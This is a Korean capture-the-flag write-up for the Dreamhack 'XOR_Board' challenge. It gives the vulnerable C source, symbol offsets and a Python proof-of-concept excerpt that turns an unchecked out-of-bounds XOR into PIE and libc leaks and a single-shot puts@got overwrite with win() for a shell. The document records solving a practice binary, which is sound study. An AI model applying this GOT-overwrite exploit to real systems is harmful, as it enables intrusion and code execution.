# XOR_Board 풀이 노트

Dreamhack `XOR_Board` — **No RELRO** 바이너리에서 OOB XOR 프리미티브로 **`puts@got`를 `win`으로 덮기**.

바이너리: x86-64, **PIE** / NX / canary, **No RELRO**(`-Wl,-z,norelro`). libc 불필요(바이너리 내 `win()` 존재).

---

## 0. 취약점 요약

| 항목 | 내용 |
|---|---|
| 근본 버그 | `xor()`의 인덱스 `i, j`가 **`int32_t` + bounds check 전무** → 임의 OOB |
| 프리미티브 | `arr[i] ^= arr[j]` = **임의 주소 XOR write + relative read** |
| 왜 GOT인가 | `-Wl,-z,norelro` → **No RELRO → GOT 쓰기 가능**. PIE여도 `arr↔GOT` 상대 오프셋은 고정 |
| 최종 목표 | `puts@got = &win` → `print_menu()`의 `puts()`가 곧 `win()` → `system("/bin/sh")` |

```c
uint64_t arr[64] = {0};

void initialize() { for (int i=0;i<64;i++) arr[i] = 1ul << i; }   // ★ 64비트 basis

void xor() {
    int32_t i, j;                 // ★ signed, 검사 없음 → 음수/OOB 가능
    scanf("%d%d", &i, &j);
    arr[i] ^= arr[j];             // 임의 XOR write / relative read
}
void print() {
    uint32_t i;                   // ★ unsigned → 음수 인덱스 불가(= GOT 직접 leak 불가)
    scanf("%d", &i);
    printf("Value: %lx\n", arr[i]);
}
void win() { system("/bin/sh"); }
int main() { ... while(1){ print_menu(); scanf(option); ... } }   // print_menu 가 매 루프 puts 호출
```

---

## 1. 메모리 배치 — arr 기준 상대 인덱스

`arr`가 GOT **바로 위**에 있어 GOT는 **음수 인덱스**로 닿는다 (8바이트 단위).

| 심볼 | 바이너리 오프셋 | arr 기준 인덱스 `(off-0x34c0)/8` |
|---|---|---|
| `arr[0]` | `0x34c0` | 0 |
| `puts@got` | `0x3428` | **-19** (덮을 대상) |
| `R_X86_64_RELATIVE` 슬롯 | `0x3210` | **-87** (leak 소스) |
| `win()` | `0x13ed` | — |

```
objdump -R main | grep puts     # 0x3428 R_X86_64_JUMP_SLOT puts
nm main | grep -w arr           # 0x34c0 B arr
nm main | grep -w win           # 0x13ed T win
```

---

## 2. 함정 두 개 (이 문제의 핵심)

### 함정 1 — `print()`가 unsigned라 GOT를 직접 못 읽는다
`print()`의 인덱스는 `uint32_t`. 음수(-19 등)를 넣으면 `0xFFFF...`인 거대한 양수로 해석돼
수십 GB 밖을 읽어 **segfault**. 즉 GOT는 **write(xor)는 되지만 read(print)는 안 된다**.

> **해결:** 읽고 싶은 OOB 값을 **in-bounds 슬롯으로 XOR해 당겨온 뒤** `print`로 읽는다.
> `arr[s] ^= arr[oob]` → `print(s)` → 다시 `arr[s] ^= arr[oob]`로 원상복구(XOR는 가역).
> 이때 당겨온 값 = `원래값 ^ 타겟` 이므로 `원래값`을 XOR하면 타겟 복원.

PIE base leak은 lazy binding 여부와 무관하게 항상 `base+0x11e0`로 채워지는
`R_X86_64_RELATIVE` 슬롯(-87)을 쓴다. → `pie = (leak ^ 1) - 0x11e0`.

### 함정 2 — `puts@got`를 "조금씩" 쌓으면 중간에 죽는다
`print_menu()`가 **매 루프 첫 줄**에서 `puts()`를 호출한다. 그래서 `puts@got`를
비트 단위로 XOR해 가며 쌓으면, 아직 완성 안 된 **쓰레기 주소**로 다음 `puts()`가 점프 → crash.
(printf 타깃도 `xor()` 진입 시 `printf` 호출 때문에 같은 이유로 incremental 불가.)

> **해결:** **single-shot 덮기.**
> 1. 현재 `puts@got`(이미 resolve된 libc puts)를 leak
> 2. `delta = libc_puts ⊕ win` 을 **스크래치 슬롯 arr[63]** 에 조립 (이 동안 `puts@got` 안 건드림 → print_menu 안전)
> 3. **딱 한 번** `arr[-19] ^= arr[63]` → `puts@got = libc_puts ⊕ delta = win`

arr[63]을 스크래치로 쓰는 이유: 주소가 48비트 미만 → basis 비트 63은 조립에 안 쓰여 충돌 없음.

---

## 3. XOR Board의 의도 — basis로 임의 값 조립

`arr[k] = 1<<k` (k=0..63)는 **64비트 standard basis**. 따라서 어떤 64비트 값 `V`든

```
arr[t] ^= arr[t]                 # 소거 → 0
for b in set_bits(V): arr[t] ^= arr[b]   # arr[b]=1<<b 를 쌓아 V 완성
```

으로 `arr[t] = V`를 만들 수 있다. 문제 이름 그대로 "XOR 보드"가 곧 임의 쓰기 수단.

---

## 4. Exploit 흐름

```
① PIE leak : arr[0] ^= arr[-87]; print(0); 복구 → pie, &win
② puts leak: arr[1] ^= arr[-19]; print(1); 복구 → libc_puts
③ delta 조립: delta = libc_puts ^ win  →  arr[63]에 basis로 build
④ 덮기    : arr[-19] ^= arr[63]  →  puts@got = win
⑤ 트리거  : 다음 루프의 print_menu() → puts("1. XOR ...") → win() → shell
```

핵심 코드 (`deploy/poc.py`):

```python
def pull_leak(slot, oob_idx):          # OOB 값을 in-bounds 로 당겨 읽고 복구
    base_val = read(slot)
    xor(slot, oob_idx);  mixed = read(slot);  xor(slot, oob_idx)
    return base_val ^ mixed

pie = pull_leak(0, RELA_IDX) - RELA_VAL         # ①
win_addr  = pie + WIN
libc_puts = pull_leak(1, PUTS_IDX)              # ②

delta = libc_puts ^ win_addr                    # ③
xor(SCRATCH, SCRATCH)                           #   arr[63] = 0
for b in range(delta.bit_length()):
    if (delta >> b) & 1: xor(SCRATCH, b)        #   arr[63] = delta

xor(PUTS_IDX, SCRATCH)                           # ④ puts@got = win  → ⑤ shell
```

---

## 5. 결과

```
[+] PIE base : 0x5dff6adc2000
[+] win()    : 0x5dff6adc33ed
[+] libc puts: 0x7e36025b2be0
$ id → uid=1000(...)            # shell 획득
```

리모트: `python3 poc.py REMOTE=host3.dreamhack.games:15334`

---

## 6. 배울 점

- **No RELRO = GOT overwrite**가 거의 항상 정답. PIE여도 `arr↔GOT` 상대 오프셋은 고정이라 OOB 인덱스로 도달 가능.
- **signed/unsigned 비대칭**(`xor`는 signed=OOB 가능, `print`는 unsigned=음수 불가)이 "write는 되는데 read는 안 되는" 구도를 만든다 → **값을 in-bounds로 당겨와 읽기**.
- **덮을 GOT 선택 = 트리거 함수 분석**. 조립 중에 호출되는 함수(`print_menu`의 puts)를 타깃으로 쓰면 incremental이 불가 → **resolve된 값을 leak해 single-shot XOR**로 덮는다.
- `win()`은 인자를 무시하므로 어떤 호출 지점을 가로채도 무방.
